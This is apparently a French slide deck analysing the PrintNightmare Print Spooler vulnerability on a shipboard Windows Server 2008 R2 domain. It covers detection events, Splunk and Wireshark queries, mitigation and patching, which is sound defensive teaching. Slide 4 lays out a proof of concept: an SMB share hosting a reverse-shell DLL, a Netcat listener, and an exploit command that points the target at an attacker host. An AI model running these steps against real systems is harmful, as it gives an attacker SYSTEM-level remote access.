# PrintNightmare – Une faille critique en environnement Windows Server 2008 R2

## Slide 1 : Introduction

### Contexte
- Un système basé sur Windows Server 2008 R2 en Active Directory, utilisé à bord d'un bâtiment en mer
- Le service Print Spooler est activé pour la gestion des impressions réseau
- La vulnérabilité PrintNightmare (CVE-2021-1675 & CVE-2021-34527) expose le système à des attaques critiques

### Problématique
- Une faille de type Remote Code Execution (RCE) permettant une élévation de privilèges jusqu'au niveau NT AUTHORITY\SYSTEM
- Impact majeur sur la sécurité des systèmes critiques en environnement isolé

![Schéma d'un Active Directory avec le rôle Print Spooler activé]()

## Slide 2 : Exploitation – Principe de l'attaque

### Le Print Spooler
- Service Windows natif, activé par défaut, permettant la gestion des files d'impression
- Accessible en local et via le réseau (RPC)

### Le mécanisme de l'attaque
- L'attaquant utilise RpcAddPrinterDriverEx() pour charger un pilote d'imprimante malveillant
- Le service Spooler exécute le code avec les privilèges SYSTEM
- L'attaquant obtient un accès total à la machine cible

![Diagramme expliquant le flux de l'attaque]()

## Slide 3 : Impact – Analyse de la severité à bord
*À faire*

## Slide 4 : Exploitation – Preuve de concept (POC)

### Conditions préalables
- Une machine cible Windows Server 2008 R2 avec Print Spooler activé
- Une machine attaquante Kali Linux avec Netcat

### Étapes de l'exploitation

1. Vérification du Print Spooler actif :
```powershell
Get-Service -Name Spooler
```

2. Création de la DLL malveillante (reverse shell en C++)
   - Un fichier revshell.dll est généré (code en annexe)

3. Mise en place d'un serveur SMB pour héberger la DLL
```bash
python3 smbserver.py share . -smb2support
```

4. Lancement d'un listener Netcat sur l'attaquant
```bash
nc -lvnp 4444
```

5. Exploitation de la vulnérabilité
```bash
python3 exploit.py j.doe:password@victim_ip \\attacker_ip\share\revshell.dll
```

![Capture d'un shell NT AUTHORITY\SYSTEM obtenu via Netcat]()

## Slide 5 : Détection – Identification des signes d'attaque

### Windows Event Logs à surveiller
- Microsoft-Windows-PrintService/Operational (Event ID 316)
  - Ajout ou mise à jour suspecte d'un pilote d'impression
- Microsoft-Windows-PrintService/Admin (Event ID 808, 811)
  - Tentative de chargement de plug-in ou échec de chargement d'une DLL malveillante
- Microsoft-Windows-SMBClient/Security (Event ID 31017)
  - Chargement d'un driver non signé via SMB
- Windows System (Event ID 7031)
  - Arrêt inattendu du service Print Spooler (spoolsv.exe)

### Sysmon pour une analyse plus avancée
- Sysmon Event ID 3 (Network Connection)
  - Recherche d'une connexion inhabituelle liée au spooler
- Sysmon Event ID 11 (FileCreate)
  - Surveillance de la création de DLL dans C:\Windows\System32\spool\drivers\x64\3\
- Sysmon Event ID 23, 26 (FileDelete)
  - Suppression suspecte de fichiers après exploitation

![Capture d'un log Event Viewer montrant un ajout de pilote suspect]()

## Slide 6 : Détection – Threat Hunting et IoC

### Indicateurs de compromission (IoC)
1. Exécution suspecte de rundll32.exe par spoolsv.exe
```sql
| tstats count from datamodel=Endpoint.Processes where 
Processes.parent_process_name=spoolsv.exe 
Processes.process_name=rundll32.exe
```

2. Présence de DLL malveillantes dans les dossiers spooler
```sql
source="WinEventLog:Microsoft-Windows-PrintService/Operational" 
EventCode=316 category = "Adding a printer driver"
Message = "*.DLL.*"
```

3. Détection d'un pilote d'impression "QMS 810" lié à Mimikatz
   - Ce driver peut être un faux pilote utilisé par l'attaquant

### Surveillance proactive des fichiers spooler
Chemins à surveiller :
- %WINDIR%\system32\spool\drivers\x64\3\
- %WINDIR%\system32\spool\drivers\x64\3\Old\

Fichiers suspects :
- evil.dll
- addCube.dll
- rev.dll
- mimilib.dll

![Capture d'un Splunk Query détectant un processus suspect]()

## Slide 7 : Détection – Analyse PCAP et trafic réseau

### Filtres Wireshark pour détecter l'attaque
```wireshark
# Détection des appels DCE/RPC
dcerpc.opnum == 0x01f AND dcerpc.iface == 12345678-1234-abcd-ef00-0123456789ab

# Détection des DLLs via SMB
smb2.filename contains ".dll" AND smb2.flags.response == 0

# Filtrer le trafic attaquant/victime
ip.src == <IP ATTAQUANT> && ip.dst == <IP VICTIME>

# Recherche d'exécutable malveillant
smb2.pipe_name contains "spoolss"

# Détection chiffrement SMB3
smb2.encryption_algorithm
```

### Limitations de la détection via PCAP
- SMB3 chiffré rend l'exploit plus difficile à détecter
- Un attaquant expérimenté peut masquer ses traces

![Capture d'un PCAP montrant un échange DCE/RPC et SMB]()

## Slide 8 : Mitigation – Réduction immédiate du risque

### Vérification du service
```powershell
Get-Service -Name Spooler
```

### Option 1 : Désactivation totale (Recommandé)
```powershell
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
```
✅ Plus aucun risque, mais plus d'impression possible

### Option 2 : Bloquer l'impression réseau via GPO
1. Computer Configuration / Administrative Templates / Printers
2. "Allow Print Spooler to accept client connections" : DISABLED
3. Appliquer les changements :
```powershell
gpupdate /force
```
✅ L'impression locale fonctionne, mais l'attaque est bloquée

![Capture d'une GPO désactivant Print Spooler]()

## Slide 9 : Remédiation – Correction définitive

### 1. Vérifier et appliquer le correctif KB5005010
```cmd
wmic qfe | findstr KB5005010
```
✅ Ce correctif bloque définitivement PrintNightmare

### 2. Sécuriser le registre
```cmd
# Vérifier l'état
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint"

# Modifier les valeurs
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" /v NoWarningNoElevationOnInstall /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" /v UpdatePromptSettings /t REG_DWORD /d 0 /f
```
✅ Empêche toute installation furtive de pilotes malveillants

![Capture de Windows Update et registre]()

## Slide 10 : Remédiation – Vérifications post-correction

### 3. Vérifier la protection
```powershell
# Contrôle des pilotes
Get-PrinterDriver | Select Name, Version

# Audit des journaux
Get-WinEvent -LogName "Microsoft-Windows-PrintService/Operational"
```
✅ Aucun pilote suspect = système sécurisé

### 4. Surveillance SIEM et alertes
Events critiques à surveiller :
- Event ID 808, 811 : Installation de driver suspect
- Event ID 7031 : Arrêt anormal du spooler
- Event ID 316 : Ajout de pilote anormal

Règle d'audit automatisée :
```powershell
Get-WinEvent -LogName "Microsoft-Windows-PrintService/Operational" | Where-Object {$_.Id -eq 808}
```
✅ Protection continue contre PrintNightmare

![Tableau SIEM avec logs suspects]()

## Slide 11 : Conclusion

### PrintNightmare : Vulnérabilité critique
- Élévation de privilèges et RCE
- Cible : serveurs Windows avec Print Spooler
- Exploitation simple et documentée

### Stratégie de défense efficace
1. Mitigation immédiate : Désactivation du Print Spooler ou restriction réseau
2. Remédiation définitive : Correctif KB5005010 et sécurisation du registre
3. Surveillance proactive : Audits et alertes SIEM

✅ Combinaison nécessaire pour une protection complète

![Schéma des trois étapes de défense]()

## Slide 12 : Sources et références

### Articles techniques et analyses
- [Jumpsec Labs – Analyse réseau](https://labs.jumpsec.com/printnightmare-network-analysis/)
- [LaresLLC – Guide d'exploitation](https://github.com/LaresLLC/CVE-2021-1675)

### Documentation Microsoft
- [Patch KB5005010 & recommandations](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)

![Logos des sources]()
